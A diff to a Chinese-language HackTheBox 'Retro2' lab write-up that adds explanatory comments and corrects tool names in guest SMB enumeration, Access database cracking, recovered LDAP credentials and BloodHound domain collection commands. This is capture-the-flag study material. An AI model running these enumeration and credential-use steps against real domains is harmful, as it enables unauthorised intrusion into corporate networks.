@@ -2,14 +2,17 @@
 
 Windows
 
+在HTB的Pwnbox,kali开启openvpn,以及win11直接来回跳，目标ip有所改变。
+
 ### 1.信息收集
 ![还要继续吗](images/081101.png)
 ```
 echo 'IP retro2.vl' | sudo tee -a /etc/hosts'
 ```
 ![还要继续吗](images/081102.png)
+出现 BLN01.retro2.vl
+#### 尝试使用 guest 账户、空密码连接目标 SMB 服务，并列出可用共享及访问权限
 ```
-$ echo 'IP BLN01.retro2.vl' | sudo tee -a /etc/hosts'
 $ nxc smb 10.129.86.138 -u 'guest' -p '' --shares
 ```
 
@@ -20,7 +23,7 @@ $ impacket-smbclient guest@retro2.vl -no-pass
 # ls
 # tree
 
-# get /DB/staff.accdb
+# get /DB/staff.accdb  //下载到本地
 # exit
 ```
 
@@ -38,8 +41,10 @@ $ gunzip -d rockyou.txt.gz
 输入密码后，我们查看文件的Visual Basic内容，在其中找到Active用于LDAP认证的目录凭据
 ![还要继续吗](images/081107.png)
 retro2\ldapreader 密码为“ppYaVcB5R"
+
+#### 用 NetExec 连接 LDAP 服务,-u用户名；BLN01.retro2.vl → 目标域控主机名（FQDN，需要能解析）
 ```
-$ ncx ldap BLN01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R'
+$ nxc ldap BLN01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R'
 ```
 ![还要继续吗](images/081108.png)
 
@@ -68,8 +73,9 @@ $ sudo ./bloodhound-cli install
 
 区别如图
 ![还要继续吗](images/081110.png)
+#### 用 ldapreader 账号，通过指定的 DNS 服务器 10.129.79.204 解析并连接到域控 BLN01.retro2.vl，收集整个 retro2.vl 域的所有信息，最后打包成一个 zip 文件给 BloodHound 分析
 ```
-$ bloodhoud-python -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl --zip -c All -dc BLN01.retro2.vl -nc 10.129.79.204
+$ bloodhound-python -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl --zip -c All -dc BLN01.retro2.vl -ns 10.129.79.204
 ```
 ![还要继续吗](images/081111.png)
 生成了bloodhound.zip文件，上传到 BloodHound 的 Web 界面进行可视化分析，从而查看域内所有用户、组以及他们的归属关系
@@ -91,4 +97,6 @@ $ bloodhoud-python -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl --zip -c All -dc 
 
 ### 6.攻击之路
 
+https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df
+在网上搜索这方面的信息时，它解释了计算机创建的的SamAccountName的密码，帐户用小写减去美元符号
 
